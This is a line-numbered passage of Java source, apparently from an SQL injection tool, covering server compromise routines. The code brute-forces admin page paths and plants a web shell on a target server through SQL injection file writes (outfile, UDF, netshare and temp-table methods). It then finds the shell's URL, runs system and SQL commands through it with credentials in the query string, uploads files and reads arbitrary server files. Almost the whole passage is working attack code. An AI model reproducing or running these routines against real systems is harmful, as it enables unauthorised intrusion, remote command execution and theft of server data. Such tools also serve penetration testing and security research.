92      /**
93       * Check if every page in the list responds 200 Success.
94       * @param pageNames    List of admin pages to test
95       */
96      public int createAdminPages(String urlInjection, List<String> pageNames) {
97          var matcher = Pattern.compile("^((https?://)?[^/]*)(.*)").matcher(urlInjection);
98          matcher.find();
99          String urlProtocol = matcher.group(1);
100         String urlWithoutProtocol = matcher.group(3);
101 
102         List<String> folderSplits = new ArrayList<>();
103 
104         // Hostname only
105         if (urlWithoutProtocol.isEmpty() || !Pattern.matches("^/.*", urlWithoutProtocol)) {
106             urlWithoutProtocol = "/dummy";
107         }
108         String[] splits = urlWithoutProtocol.split("/", -1);
109         String[] folderNames = Arrays.copyOf(splits, splits.length - 1);
110         for (String folderName: folderNames) {
111             folderSplits.add(folderName +"/");
112         }
113 
114         ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetAdminPage");
115         CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
116 
117         var urlPart = new StringBuilder();
118         for (String segment: folderSplits) {
119             urlPart.append(segment);
120             for (String pageName: pageNames) {
121                 taskCompletionService.submit(
122                     new CallableHttpHead(
123                         urlProtocol + urlPart + pageName,
124                         this.injectionModel,
125                         "check:page"
126                     )
127                 );
128             }
129         }
130 
131         var nbAdminPagesFound = 0;
132         int submittedTasks = folderSplits.size() * pageNames.size();
133         int tasksHandled;
134         for (
135             tasksHandled = 0
136             ; tasksHandled < submittedTasks && !this.isSearchAdminStopped()
137             ; tasksHandled++
138         ) {
139             nbAdminPagesFound = this.callAdminPage(taskCompletionService, nbAdminPagesFound);
140         }
141 
142         this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
143         this.isSearchAdminStopped = false;
144         this.logSearchAdminPage(nbAdminPagesFound, submittedTasks, tasksHandled);
145 
146         return nbAdminPagesFound;
147     }

149     public int callAdminPage(CompletionService<CallableHttpHead> taskCompletionService, int nbAdminPagesFound) {
150         int nbAdminPagesFoundFixed = nbAdminPagesFound;
151         
152         try {
153             CallableHttpHead currentCallable = taskCompletionService.take().get();
154             if (currentCallable.isHttpResponseOk()) {
155                 var request = new Request();
156                 request.setMessage(Interaction.CREATE_ADMIN_PAGE_TAB);
157                 request.setParameters(currentCallable.getUrl());
158                 this.injectionModel.sendToViews(request);
159 
160                 nbAdminPagesFoundFixed++;
161                 LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Found page: {}", currentCallable.getUrl());
162             }
163         } catch (InterruptedException e) {
164             LOGGER.log(LogLevelUtil.IGNORE, e, e);
165             Thread.currentThread().interrupt();
166         } catch (ExecutionException e) {
167             LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
168         }
169         return nbAdminPagesFoundFixed;
170     }

322      * Create shell on remote server
323      * @param urlExploit  URL for the script (used for url rewriting)
324      */
325     public String createExploit(
326         String pathRemoteFolder,
327         String urlExploit,
328         String keyPropertyExploit,
329         String nameExploit,
330         BinaryOperator<String> biFuncGetRequest,
331         String pathNetshareFolder,
332         ExploitMode exploitMode
333     ) throws JSqlException {
334         if (this.isReadingNotAllowed()) {
335             return null;
336         }
337 
338         String bodyExploit = StringUtil.base64Decode(
339             this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty(keyPropertyExploit)
340         )
341         .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
342         .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
343 
344         // outfile + binary: content corruption
345         BiPredicate<String, String> biPredConfirm = (String pathFolder, String nameFile) -> {
346             try {
347                 String resultInjection = this.confirmExploit(pathFolder + nameFile);
348                 return resultInjection.contains(bodyExploit);
349             } catch (JSqlException e) {
350                 throw new JSqlRuntimeException(e);
351             }
352         };
353 
354         var nbIndexesFound = this.injectionModel.getMediatorStrategy().getSpecificUnion().getNbIndexesFound() - 1;
355         String nameExploitValidated = StringUtils.EMPTY;
356 
357         if (exploitMode == ExploitMode.NETSHARE) {
358             ResourceAccess.copyToShare(pathNetshareFolder + nameExploit, bodyExploit);
359             nameExploitValidated = this.injectionModel.getUdfAccess().byNetshare(
360                 nbIndexesFound,
361                 pathNetshareFolder,
362                 nameExploit,
363                 pathRemoteFolder,
364                 biPredConfirm
365             );
366         } else if (exploitMode == ExploitMode.AUTO || exploitMode == ExploitMode.QUERY_BODY) {
367             nameExploitValidated = this.injectionModel.getUdfAccess().byQueryBody(
368                 nbIndexesFound,
369                 pathRemoteFolder,
370                 nameExploit,
371                 StringUtil.toHexChunks(bodyExploit.getBytes()),
372                 biPredConfirm
373             );
374         }
375         if (StringUtils.isEmpty(nameExploitValidated) && exploitMode == ExploitMode.AUTO || exploitMode == ExploitMode.TEMP_TABLE) {
376             var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
377             this.injectionModel.getUdfAccess().byTable(
378                 StringUtil.toHexChunks(bodyExploit.getBytes()),
379                 pathRemoteFolder + nameExploitRandom
380             );
381             if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
382                 nameExploitValidated = nameExploitRandom;
383             }
384         }
385 
386         if (StringUtils.isEmpty(nameExploitValidated)) {
387             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit creation failure: source file not found at [{}{}]", pathRemoteFolder, nameExploitValidated);
388             return null;
389         }
390         nameExploit = nameExploitValidated;
391         LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Exploit creation successful: source file found at [{}{}]", pathRemoteFolder, nameExploitValidated);
392 
393         return this.checkUrls(urlExploit, nameExploit, biFuncGetRequest);
394     }

396     private String checkUrls(String urlExploit, String nameExploit, BinaryOperator<String> biFuncGetRequest) {
397         String urlExploitFixed = urlExploit;
398         if (!urlExploitFixed.isEmpty()) {
399             urlExploitFixed = urlExploitFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
400         }
401         String url = urlExploitFixed;
402         if (StringUtils.isEmpty(url)) {
403             url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
404         }
405         String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", StringUtils.EMPTY);
406         String urlProtocol;
407         if ("/".equals(urlWithoutProtocol)) {
408             urlProtocol = url.replaceAll("/+$", StringUtils.EMPTY);
409         } else {
410             urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);
411         }
412 
413         List<String> directoryNames = new ArrayList<>();
414         String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", StringUtils.EMPTY).replaceAll("/+", "/");
415         if (urlWithoutFileName.split("/").length == 0) {
416             directoryNames.add("/");
417         }
418         for (String directoryName: urlWithoutFileName.split("/")) {
419             directoryNames.add(directoryName +"/");
420         }
421         String urlSuccess = this.getExploitUrl(nameExploit, directoryNames, urlProtocol);
422         if (urlSuccess != null) {
423             urlSuccess = biFuncGetRequest.apply(nameExploit, urlSuccess);
424         } else {
425             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit access failure: connection URL not found");
426         }
427         return urlSuccess;
428     }

451     private String getExploitUrl(String filename, List<String> directoryNames, String urlProtocol) {
452         ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetExploitUrl");
453         CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
454         var urlPart = new StringBuilder();
455 
456         for (String segment: directoryNames) {
457             urlPart.append(segment);
458             taskCompletionService.submit(
459                 new CallableHttpHead(
460                     urlProtocol + urlPart + filename,
461                     this.injectionModel,
462                     "xplt#confirm-url"
463                 )
464             );
465         }
466 
467         String urlSuccess = null;
468         int submittedTasks = directoryNames.size();
469         for (var tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
470             try {
471                 CallableHttpHead currentCallable = taskCompletionService.take().get();
472                 if (currentCallable.isHttpResponseOk()) {
473                     urlSuccess = currentCallable.getUrl();
474                     LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Exploit successful: connection done to [{}]", currentCallable.getUrl());
475                     break;
476                 }
477             } catch (InterruptedException e) {
478                 LOGGER.log(LogLevelUtil.IGNORE, e, e);
479                 Thread.currentThread().interrupt();
480             } catch (ExecutionException e) {
481                 LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
482             }
483         }
484 
485         this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
486         return urlSuccess;
487     }

489     public String runCommandShell(String urlCommand) {
490         String pageSource;
491         try {
492             pageSource = this.injectionModel.getMediatorUtils().getConnectionUtil().getSource(urlCommand);
493         } catch (Exception e) {
494             pageSource = StringUtils.EMPTY;
495         }
496         
497         var regexSearch = Pattern.compile("(?s)<"+ DataAccess.LEAD +">(.*?)<"+ DataAccess.TRAIL +">").matcher(pageSource);
498         regexSearch.find();
499 
500         String result;
501         // IllegalStateException #1544: catch incorrect execution
502         try {
503             result = regexSearch.group(1);
504         } catch (IllegalStateException e) {
505             result = StringUtils.EMPTY;  // fix return null from regex
506             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Command failure: incorrect response from shell");
507         }
508         return result;
509     }

545     public String runSqlShell(String command, UUID uuidShell, String urlExploit, String username, String password, boolean isWithView) {
546         String result = this.runCommandShell(String.format(
547              "%s?q=%s&u=%s&p=%s",
548              urlExploit,
549              URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1),
550              username,
551              password
552         ));
553             
554         if (result.contains("<SQLr>")) {
555             List<List<String>> listRows = this.parse(result);
556             if (listRows.isEmpty()) {
557                 result = "Result not found: check your credentials or review logs in tab Network\n";
558             } else {
559                 List<Integer> listFieldsLength = this.parseColumnLength(listRows);
560                 result = this.convert(listRows, listFieldsLength);
561             }
562         } else if (result.contains("<SQLm>")) {  // todo deprecated
563             result = result.replace("<SQLm>", StringUtils.EMPTY) +"\n";
564         } else if (result.contains("<SQLe>")) {  // todo deprecated
565             result = result.replace("<SQLe>", StringUtils.EMPTY) +"\n";
566         }
567 
568         if (isWithView) {
569             var request = new Request();  // Unfreeze GUI terminal
570             request.setMessage(Interaction.GET_EXPLOIT_SQL_RESULT);
571             request.setParameters(uuidShell, result, command);
572             this.injectionModel.sendToViews(request);
573         }
574         return result;
575     }

577     private String convert(List<List<String>> listRows, List<Integer> listFieldsLength) {
578         var tableText = new StringBuilder("+");
579         for (Integer fieldLength: listFieldsLength) {
580             tableText.append("-").append(StringUtils.repeat("-", fieldLength)).append("-+");
581         }
582         tableText.append("\n");
583         for (List<String> listFields: listRows) {
584             tableText.append("|");
585             var cursorPosition = 0;
586             for (String field: listFields) {
587                 tableText.append(StringUtils.SPACE)
588                     .append(field)
589                     .append(StringUtils.repeat(StringUtils.SPACE, listFieldsLength.get(cursorPosition) - field.length()))
590                     .append(" |");
591                 cursorPosition++;
592             }
593             tableText.append("\n");
594         }
595         tableText.append("+");
596         for (Integer fieldLength: listFieldsLength) {
597             tableText.append("-").append(StringUtils.repeat("-", fieldLength)).append("-+");
598         }
599         tableText.append("\n");
600         return tableText.toString();
601     }

603     private List<Integer> parseColumnLength(List<List<String>> listRows) {
604         List<Integer> listFieldsLength = new ArrayList<>();
605         for (
606             var indexLongestRowSearch = 0;
607             indexLongestRowSearch < listRows.get(0).size();
608             indexLongestRowSearch++
609         ) {
610             int indexLongestRowSearchFinal = indexLongestRowSearch;
611             listRows.sort(
612                 (firstRow, secondRow) -> secondRow.get(indexLongestRowSearchFinal).length() - firstRow.get(indexLongestRowSearchFinal).length()
613             );
614             listFieldsLength.add(listRows.get(0).get(indexLongestRowSearch).length());
615         }
616         return listFieldsLength;
617     }

619     private List<List<String>> parse(String result) {
620         List<List<String>> listRows = new ArrayList<>();
621         var rowsMatcher = Pattern.compile("(?si)<tr>(<td>.*?</td>)</tr>").matcher(result);
622         while (rowsMatcher.find()) {
623             String values = rowsMatcher.group(1);
624             var fieldsMatcher = Pattern.compile("(?si)<td>(.*?)</td>").matcher(values);
625             List<String> listFields = new ArrayList<>();
626             listRows.add(listFields);
627             
628             while (fieldsMatcher.find()) {
629                 String field = fieldsMatcher.group(1);
630                 listFields.add(field);
631             }
632         }
633         return listRows;
634     }

636     private HttpResponse<String> upload(File file, String url, InputStream streamToUpload) throws IOException, JSqlException, InterruptedException {
637         var crLf = "\r\n";
638         var boundary = "---------------------------4664151417711";
639         
640         var streamData = new byte[streamToUpload.available()];
641         if (streamToUpload.read(streamData) == -1) {
642             throw new JSqlException("Error reading the file");
643         }
644         
645         String headerForm = StringUtils.EMPTY;
646         headerForm += "--"+ boundary + crLf;
647         headerForm += "Content-Disposition: form-data; name=\"u\"; filename=\""+ file.getName() +"\""+ crLf;
648         headerForm += "Content-Type: binary/octet-stream"+ crLf;
649         headerForm += crLf;
650 
651         String headerFile = StringUtils.EMPTY;
652         headerFile += crLf +"--"+ boundary +"--"+ crLf;
653 
654         var httpRequest = HttpRequest.newBuilder()
655             .uri(URI.create(url))
656             .timeout(Duration.ofSeconds(15))
657             .POST(BodyPublishers.ofByteArrays(
658                 Arrays.asList(
659                     headerForm.getBytes(StandardCharsets.UTF_8),
660                     Files.readAllBytes(Paths.get(file.toURI())),
661                     headerFile.getBytes(StandardCharsets.UTF_8)
662                 )
663             ))
664             .setHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
665             .build();
666 
667         var response = this.injectionModel.getMediatorUtils().getConnectionUtil().getHttpClient().build().send(httpRequest, BodyHandlers.ofString());
668         HttpHeaders httpHeaders = response.headers();
669         String pageSource = response.body();
670 
671         Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
672         msgHeader.put(Header.URL, url);
673         msgHeader.put(Header.HEADER, ConnectionUtil.getHeadersMap(httpRequest.headers()));
674         msgHeader.put(Header.RESPONSE, ConnectionUtil.getHeadersMap(httpHeaders));
675         msgHeader.put(Header.SOURCE, pageSource);
676         msgHeader.put(Header.METADATA_PROCESS, "upl#multipart");
677         var request = new Request();
678         request.setMessage(Interaction.MESSAGE_HEADER);
679         request.setParameters(msgHeader);
680         this.injectionModel.sendToViews(request);
681         return response;
682     }

686      * @return True if user can read file, false otherwise
687      * @throws JSqlException when an error occurs during injection
688      */
689     public boolean isReadingNotAllowed() throws JSqlException {
690         // Unsupported Reading file when <file> is not present in current xmlModel
691         // Fix #41055: NullPointerException on getFile()

697             );
698             return true;
699         }
700         
701         var sourcePage = new String[]{ StringUtils.EMPTY };
702         String resultInjection = new SuspendableGetRows(this.injectionModel).run(
703             this.injectionModel.getMediatorVendor().getVendor().instance().sqlPrivilegeTest(),
704             sourcePage,
705             false,
706             1,
707             MockElement.MOCK,
708             "privilege"
709         );
710 
711         boolean readingIsAllowed = false;
712 
713         if (StringUtils.isEmpty(resultInjection)) {
714             this.injectionModel.sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
715             var request = new Request();
716             request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
717             this.injectionModel.sendToViews(request);
718         } else if ("false".equals(resultInjection)) {
719             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Privilege FILE not granted: files not readable by current user");
720             var request = new Request();
721             request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);

724             var request = new Request();
725             request.setMessage(Interaction.MARK_FILE_SYSTEM_VULNERABLE);
726             this.injectionModel.sendToViews(request);
727             readingIsAllowed = true;
728         }
729         
730         return !readingIsAllowed;

733     /**
734      * Attempt to read files in parallel by their path from the website using injection.
735      * Reading file needs a FILE right on the server.
736      * The user can interrupt the process at any time.
737      * @param pathsFiles List of file paths to read
738      * @throws JSqlException when an error occurs during injection
739      * @throws InterruptedException if the current thread was interrupted while waiting
740      * @throws ExecutionException if the computation threw an exception
741      */
742     public List<String> readFile(List<String> pathsFiles) throws JSqlException, InterruptedException, ExecutionException {
743         if (
744             this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getMysql()
745             && this.isReadingNotAllowed()
746         ) {
747             return Collections.emptyList();
748         }
749 
750         var countFileFound = 0;
751         var results = new ArrayList<String>();
752 
753         ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableReadFile");
754         CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
755 
756         for (String pathFile: pathsFiles) {
757             var callableFile = new CallableFile(pathFile, this.injectionModel);
758             taskCompletionService.submit(callableFile);
759             this.callablesReadFile.add(callableFile);
760         }
761 
762         List<String> duplicate = new ArrayList<>();
763         int submittedTasks = pathsFiles.size();
764         int tasksHandled;
765 
766         for (
767             tasksHandled = 0
768             ; tasksHandled < submittedTasks && !this.isSearchFileStopped
769             ; tasksHandled++
770         ) {
771             var currentCallable = taskCompletionService.take().get();
772             if (StringUtils.isNotEmpty(currentCallable.getSourceFile())) {
773                 var name = currentCallable.getPathFile().substring(
774                     currentCallable.getPathFile().lastIndexOf('/') + 1
775                 );
776                 String content = currentCallable.getSourceFile();
777                 String path = currentCallable.getPathFile();
778 
779                 var request = new Request();
780                 request.setMessage(Interaction.CREATE_FILE_TAB);
781                 request.setParameters(name, content, path);
782                 this.injectionModel.sendToViews(request);
783 
784                 if (!duplicate.contains(path.replace(name, StringUtils.EMPTY))) {
785                     LOGGER.log(
786                         LogLevelUtil.CONSOLE_INFORM,
787                         "Folder candidate to exploit: {}",
788                         () -> path.replace(name, StringUtils.EMPTY)
789                     );
790                 }
791 
792                 duplicate.add(path.replace(name, StringUtils.EMPTY));
793                 results.add(content);
794 
795                 countFileFound++;
796             }
797         }
798 
799         // Force ongoing suspendables to stop immediately
800         for (CallableFile callableReadFile: this.callablesReadFile) {
801             callableReadFile.getSuspendableReadFile().stop();
802         }
803         this.callablesReadFile.clear();
804         this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
805         this.isSearchFileStopped = false;
806 
807         var result = String.format(
808             "Searched %s/%s file%s: %s found",
809             tasksHandled,
810             submittedTasks,
811             tasksHandled > 1 ? 's' : StringUtils.EMPTY,
812             countFileFound
813         );
814 
815         if (countFileFound > 0) {
816             LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, result);
817         } else {
818             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, result);
819         }
820         return results;
821     }
